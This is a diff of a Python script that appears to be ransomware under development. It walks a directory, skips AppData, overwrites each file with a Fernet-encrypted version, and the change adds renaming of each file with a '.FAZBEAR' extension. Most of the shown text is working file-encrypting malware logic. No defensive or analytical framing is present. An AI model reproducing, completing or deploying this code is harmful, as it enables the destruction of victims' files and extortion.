@@ -10,6 +10,7 @@ print(current_user)
 
 def encrypt_path():
     for root, dirs, files in os.walk(test_path):
+        
         if 'AppData' in dirs:
             dirs.remove('AppData') 
         for x in files:
@@ -23,14 +24,18 @@ def encrypt_path():
                 
                 with open(full_path, "rb") as f:
                     original_data = f.read()
+                    
          
                 #encrypt data, fernet is gonna to encrypt the content in the variable "original_data" using the loaded ke
                 encrypted_data = loaded_key.encrypt(original_data)
 
                 #save encrypted file
                 with open(full_path, "wb") as f_encrypted:
-                    f_encrypted.write(encrypted_data)
-                    print(f"encrypted : {full_path}")
+                    f_encrypted.write(encrypted_data) 
+                    #rename files 
+                new_name = os.path.join(root,x + ".FAZBEAR")
+                os.rename(full_path,new_name)
+                print(f"encrypted : {full_path}")
             except Exception as e:
                 print(f"Error in {full_path}: {e}")
 
